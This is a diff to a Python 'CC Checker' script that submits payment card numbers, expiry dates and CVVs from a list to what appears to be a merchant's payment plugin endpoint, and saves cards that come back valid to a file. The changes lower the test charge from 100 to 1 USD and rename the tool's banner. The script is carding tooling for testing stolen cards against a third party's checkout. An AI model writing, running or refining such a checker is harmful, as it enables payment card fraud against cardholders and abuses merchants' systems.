@@ -37,7 +37,7 @@ def funct(cc,mm,yy,cvv):
  }
  data3={
  'action': 'asp_pp_req_token',
- 'amount': '100',
+ 'amount': '1',
  'curr': 'USD',
  'product_id': '330',
  'quantity': '1',
@@ -96,7 +96,7 @@ def funct(cc,mm,yy,cvv):
  else:
   print('[+] '+str(cc)+' Valid')
   open('Valid.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
-print('New CC Checker Tool Coded By ARON-TN')
+print('New CC Checker Ngewe')
 print('Format : CC|mm|yy|cvv exmp : 346596528271562|09|2025|4233')
 CCList=open(input('CCs List : '),'r').read().splitlines()
 for i in CCList:
